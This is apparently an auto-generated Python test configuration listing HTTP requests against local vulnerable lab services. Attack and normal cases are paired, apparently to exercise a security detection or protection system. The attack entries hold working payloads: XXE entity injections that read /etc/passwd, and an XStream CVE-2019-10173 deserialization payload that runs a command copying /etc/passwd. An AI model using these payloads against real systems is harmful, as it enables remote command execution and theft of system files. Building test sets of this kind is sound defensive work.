# Auto-generated from index/vul.py split by module.
import os

host = os.environ.get('HOST', '192.168.0.9')

requests_config = {'xxe_wxpay_attack': {'method': 'POST',
                      'url': 'http://{}:9974/wxpay-xxe'.format(host),
                      'data': '<?xml version="1.0" encoding="utf-8"?><!DOCTYPE xdsec [<!ELEMENT methodname '
                              'ANY><!ENTITY xxe SYSTEM '
                              '"file:///etc/passwd">]><methodcall><methodname>&xxe;</methodname></methodcall>',
                      'headers': {'Content-Type': 'application/json'},
                      'name': '微信支付XXE漏洞',
                      'type': 'attack'},
 'xstream_CVE-2019-10173': {'method': 'POST',
                            'url': 'http://{}:9973/CVE-2019-10173'.format(host),
                            'data': '<sorted-set><dynamic-proxy><interface>java.lang.Comparable</interface><handler '
                                    'class="java.beans.EventHandler"><target '
                                    'class="java.lang.ProcessBuilder"><command><string>cp</string><string>/etc/passwd</string><string>/tmp</string></command></target><action>start</action></handler></dynamic-proxy></sorted-set>',
                            'headers': {'Content-Type': 'application/json'},
                            'name': 'xstream 反序列化漏洞(CVE-2019-10173)',
                            'type': 'attack'},
 'jackson-databind_CVE-2019-12384': {'method': 'GET',
                                     'url': 'http://{}:9972/CVE-2019-12384'.format(host),
                                     'headers': {'Content-Type': 'application/json'},
                                     'name': 'jackson-databind 反序列化漏洞(CVE-2019-12384)',
                                     'type': 'attack'},
 'jackson-databind_CVE-2019-12384_normal': {'method': 'GET',
                                            'url': 'http://{}:9972/playground'.format(host),
                                            'headers': {'Content-Type': 'application/json'},
                                            'name': 'jackson-databind 靶场首页(CVE-2019-12384)',
                                            'type': 'normal'},
 'cas_xxe_normal': {'method': 'POST',
                    'url': 'http://{}:9971/xxe_cas'.format(host),
                    'headers': {'Content-Type': 'application/json'},
                    'name': 'cas xxe',
                    'data': '<!--?xml version="1.0" ?--><userInfo> '
                            '<firstName>John</firstName><lastName>&ent;</lastName></userInfo>',
                    'type': 'normal'},
 'cas_xxe_attack': {'method': 'POST',
                    'url': 'http://{}:9971/xxe_cas'.format(host),
                    'headers': {'Content-Type': 'application/json'},
                    'name': 'cas xxe',
                    'data': '<!--?xml version="1.0" ?--><!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> '
                            ']><userInfo> <firstName>John</firstName><lastName>&ent;</lastName></userInfo>',
                    'type': 'attack'}}
